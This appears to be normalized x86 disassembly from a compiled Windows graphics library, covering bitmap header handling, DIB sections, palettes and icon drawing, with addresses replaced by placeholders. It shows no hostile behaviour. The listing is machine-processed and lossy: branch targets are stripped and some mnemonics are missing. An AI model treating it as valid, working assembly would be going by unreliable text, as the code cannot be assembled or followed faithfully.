mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx [ ebp - 0x3c ]
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402b98
mov eax ebx
movzx edx [ ebp - 0x44 ]
mov [ eax + 0x4 ] edx
movzx edx [ ebp - 0x42 ]
mov [ eax + 0x8 ] edx
mov dx [ ebp - 0x40 ]
mov [ eax + 0xc ] dx
mov dx [ ebp - 0x3e ]
mov [ eax + 0xe ] dx
sub esi 0xc
jmp r-xdata
mov ebx [ ebp - 0x3c ]
mov eax [ ebp - 0x20 ]
mov [ ebx ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
cmp [ ebx + 0xc ] 0x1
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x28
jne r-xdata
call sub_41e038
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebp - 0x38 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
cmp ax 0x10
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx 0xe
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax esi
xor edx edx
push edx
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_415f8c
mov edx esi
neg edx
mov cx 0x2
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xaa ]
xor ecx ecx
mov edx 0xe
call sub_402b98
mov [ ebp - 0xaa ] 0x4d42
mov eax [ ebp - 0x20 ]
add eax esi
mov [ ebp - 0xa8 ] eax
lea eax [ ebp - 0xaa ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebx + 0x20 ]
movzx edi [ ebp - 0x21 ]
xor eax eax
mov al [ edi + rw-data ]
imul ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_415f1c
mov eax [ ebx + 0x20 ]
xor edx edx
mov dl [ edi + rw-data ]
imul edx
sub esi eax
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
call sub_41e2c8
mov [ ebx + 0x20 ] eax
cmp [ ebx + 0x10 ] 0x3
jne r-xdata
cmp ax 0x20
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jbe r-xdata
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_41e2e8
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov edx [ ebp - 0x1c ]
mov ecx 0xc
mov eax [ ebp - 0x8 ]
call sub_415f1c
add [ ebp - 0x1c ] 0xc
sub esi 0xc
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov esi eax
push 0x0
call GetDC
call sub_41e158
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_422ebb
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_41e590
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x3
jne r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateDIBSection
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax esi
call sub_4026dc
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_422e23
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_415f1c
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleDC
call sub_41e158
mov [ ebp - 0x10 ] eax
push 0x1
push 0x1
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleBitmap
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
test eax eax
jbe r-xdata
call GetLastError
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_422df7
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x14 ]
push edx
push 0x4
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_41e848
mov [ ebp - 0x30 ] eax
push 0x0
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
call sub_40ce50
call sub_41e038
jmp r-xdata
xor eax eax
push ebp
push sub_422e8a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_415f1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422dfe
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call GetLastError
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422ec2
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
push eax
call DeleteObject
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
call sub_40ce50
call sub_41e038
jmp r-xdata
sub_422dfe
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026fc
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
sub_422ec2
mov eax [ ebp - 0x3c ]
cmp [ eax + 0xe ] 0x8
jbe r-xdata
lea eax [ ebp - 0x9c ]
xor ecx ecx
mov edx 0x54
call sub_402b98
lea eax [ ebp - 0x9c ]
push eax
push 0x54
mov eax [ ebp - 0x28 ]
push eax
call GetObjectA
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x60 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_422f57
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_41e848
mov [ ebp - 0x30 ] eax
sub_422f74
lea eax [ ebp - 0x9c ]
push eax
mov al [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_422928
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_422fb8
push ebx
push esi
push edi
add esp 0xffffff9c
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_422658
test esi esi
jne r-xdata
mov edx esp
mov ecx 0xe
mov eax edi
call sub_415f1c
cmp [ esp ] 0x4d42
je r-xdata
lea eax [ esp + 0xe ]
xor ecx ecx
mov edx 0x54
call sub_402b98
lea eax [ esp + 0xe ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_422928
jmp r-xdata
push esp
mov ecx esi
sub ecx 0xe
mov edx edi
mov eax ebx
call sub_422a50
call sub_41e038
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_423028
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_422658
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402b98
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
push 0x54
push edi
call GetObjectA
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
call sub_421c70
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_4230c3
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_422928
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4230ec
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebx edx
mov esi eax
mov eax esi
call sub_422514
cmp bl al
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x28 ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_422658
mov eax esi
call sub_422768
push esi
push edi
lea esi [ edi + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
cmp [ edi + 0x4 ] 0x1
sete bl
test bl bl
je r-xdata
cmp eax [ edi + 0x14 ]
jne r-xdata
mov eax esi
call sub_422658
mov eax esi
call sub_422768
mov eax esi
call sub_4225e4
cmp [ edi + 0x4 ] 0x1
jne r-xdata
cmp eax [ edi + 0x8 ]
je r-xdata
mov [ edi + 0x30 ] 0x28
jmp r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
jmp r-xdata
mov eax [ edi + 0x10 ]
call sub_421c70
mov ebp eax
mov ebp [ edi + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x18 ]
push eax
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x14 ]
mov eax esi
call sub_422074
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ edi + 0x14 ] edx
mov ebp [ edi + 0x10 ]
xor edx edx
mov [ edi + 0x10 ] edx
lea edx [ edi + 0x18 ]
push edx
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_422928
jmp r-xdata
push esp
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_422928
mov [ edi + 0x8 ] eax
jmp r-xdata
push esp
push 0x0
mov ecx ebp
mov edx [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
call sub_42160c
test bl bl
je r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_423224
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x20 ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_422668
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x8 ] edi
mov [ esp + 0x20 ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_422074
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_423278
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx edx
mov edi eax
mov esi [ edi + 0x28 ]
lea eax [ esi + 0x30 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0xe ] 0x1
je r-xdata
cmp bl al
je r-xdata
mov al 0x1
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_422668
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
xor eax eax
mov al bl
mov [ esp + 0x24 ] ax
mov [ esp + 0x26 ] ax
mov [ esp + 0x10 ] ax
mov [ esp + 0x12 ] ax
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax edi
call sub_422074
mov edx edi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4232f8
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp edi [ eax + 0x10 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_422658
mov eax ebx
call sub_422668
push esi
push edi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x58 ]
push eax
push 0x0
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov ecx edi
call sub_42160c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42338f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
mov al [ esi + 0x70 ]
push eax
push 0x0
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_422928
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_421504
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ esi + 0x10 ]
call sub_41c094
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
sub_423394
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
call sub_40394c
call sub_4039a0
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_421504
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4233cc
push ebx
push esi
mov esi eax
cmp edx [ esi + 0x34 ]
je r-xdata
pop esi
pop ebx
retn
cmp edx 0x20000000
jne r-xdata
mov [ esi + 0x38 ] 0x1
mov [ esi + 0x38 ] 0x0
jmp r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax esi
call sub_422668
lea eax [ ebx + 0x18 ]
push eax
mov ecx [ ebx + 0x10 ]
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_422074
mov [ esi + 0x34 ] edx
mov eax [ esi + 0x28 ]
cmp [ eax + 0x4 ] 0x1
jle r-xdata
sub_42341c
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x1c ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_422668
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x4 ] edi
mov [ esp + 0x1c ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_422074
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_423478
push ebx
push esi
push edi
push ebp
add esp 0xfffffbd4
mov ebx ecx
mov edi edx
mov esi eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402b98
mov [ esp + 0x10 ] 0x4d42
mov eax [ esi + 0x28 ]
mov ebp [ eax + 0x6c ]
test ebp ebp
je r-xdata
mov eax esi
call sub_4225e4
mov ebp [ esi + 0x28 ]
xor eax eax
mov [ esp ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx ]
mov [ esp ] eax
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx [ ebp + 0x50 ]
push edx
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
call sub_41ef9c
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
jmp r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_415f54
cmp [ esp ] 0x0
je r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_415f54
mov eax [ esp + 0x8 ]
add eax 0xe
add [ esp ] eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402b98
mov [ esp + 0x10 ] 0x4d42
mov eax esi
call sub_4224a8
mov dl [ r-xdata ]
call sub_41de34
mov eax [ ebp + 0x14 ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
call sub_41e158
mov [ esp + 0xc ] eax
lea eax [ esp + 0x2a ]
push eax
push 0x100
push 0x0
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call GetDIBColorTable
mov [ esp + 0x4 ] eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp + 0x50 ]
test eax eax
jbe r-xdata
mov [ esp + 0x8 ] 0xc
mov ax [ ebp + 0x3e ]
cmp ax 0x8
ja r-xdata
add esp 0x42c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebp + 0x18 ]
call sub_4215c0
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x70 ] 0x0
jne r-xdata
cmp eax [ esp + 0x4 ]
jae r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
lea eax [ eax + eax * 2 ]
add [ esp + 0x8 ] eax
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ ebp + 0x50 ]
test eax eax
je r-xdata
mov eax [ esp ]
mov [ esp + 0x12 ] eax
mov eax [ esp + 0x8 ]
add eax 0xe
mov [ esp + 0x1a ] eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_415f54
lea edx [ ebp + 0x30 ]
mov ecx 0x28
mov eax edi
call sub_415f54
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
lea eax [ ebp + 0x30 ]
mov [ esp + 0x1e ] 0xc
mov dx [ eax + 0x4 ]
mov [ esp + 0x22 ] dx
mov dx [ eax + 0x8 ]
mov [ esp + 0x24 ] dx
mov [ esp + 0x26 ] 0x1
mov ax [ eax + 0xe ]
mov [ esp + 0x28 ] ax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_415f54
lea edx [ esp + 0x1e ]
mov ecx 0xc
mov eax edi
call sub_415f54
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ ebp + 0x50 ] eax
cmp eax [ esp + 0x4 ]
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp + 0x70 ]
xor ecx ecx
mov cl [ eax + rw-data ]
imul ecx [ esp + 0x4 ]
lea edx [ esp + 0x2a ]
mov eax edi
call sub_415f54
mov edx [ ebp + 0x2c ]
mov ecx [ ebp + 0x44 ]
mov eax edi
call sub_415f54
test [ ebp + 0x40 ] 0x3
je r-xdata
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x2a ]
call sub_41e5c8
cmp [ ebp + 0x70 ] 0x0
je r-xdata
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
lea edx [ ebp + 0x58 ]
mov ecx 0xc
mov eax edi
call sub_415f54
lea edx [ esp + 0x2a ]
mov ecx 0xff
mov eax [ ebp + 0x10 ]
call sub_41e8ec
mov [ esp + 0x4 ] eax
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
mov eax [ esp + 0x4 ]
shl eax 0x2
add [ esp ] eax
add [ esp + 0x8 ] eax
sub_423738
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov [ edx ] 0x2
mov eax ebx
call sub_422668
mov esi [ ebx + 0x28 ]
push esi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov edi [ esi + 0x10 ]
mov ecx edi
mov edx edi
mov eax [ esi + 0x8 ]
call sub_42160c
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
xor eax eax
push ebp
push sub_4237b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
call sub_421c70
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4237d8
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403198
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403188
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_423820
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41f2d8
mov [ edi + 0x21 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_421438
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_423874
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_42143c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414628
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_4238a4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
xor ecx ecx
xor edx edx
mov eax esi
call sub_423b7c
mov edi ebx
mov eax [ edi + 0x28 ]
call sub_421438
mov eax [ esi + 0x28 ]
call sub_42143c
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_414654
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
sub_423904
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax esi
call sub_41de34
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_42395c
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ esi + 0x4 ]
push eax
call DrawIconEx
pop edi
pop esi
pop ebx
retn
sub_423998
push ebx
push esi
add esp 0xfffffff4
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_415d10
mov edx esp
mov ecx 0x6
mov eax [ ebx + 0xc ]
call sub_415f1c
mov ax [ esp + 0x2 ]
sub ax 0x1
jb r-xdata
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
jmp r-xdata
je r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
push 0x6
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebx + 0x10 ]
push eax
movzx ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
mov eax [ ebx + 0xc ]
call sub_41eb98
jmp r-xdata
jmp r-xdata
call sub_41e044
sub_423a10
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_423a9d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_42395c
cmp eax [ rw-data ]
jne r-xdata
call sub_41e044
mov eax esi
call sub_42395c
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_41f0dc
lea eax [ ebp - 0xa ]
xor ecx ecx
mov edx 0x6
call sub_402b98
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_415f54
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_423ac4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_423b52
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_415cf0
pop edx
sub edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax esi
call sub_415f1c
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_415f1c
mov ax [ ebp - 0x8 ]
sub ax 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_423b7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_41e044
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_423b57
mov eax [ ebp - 0x4 ]
call sub_403198
call sub_40394c
call sub_4039a0
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_423b7c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_423bbc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_421438
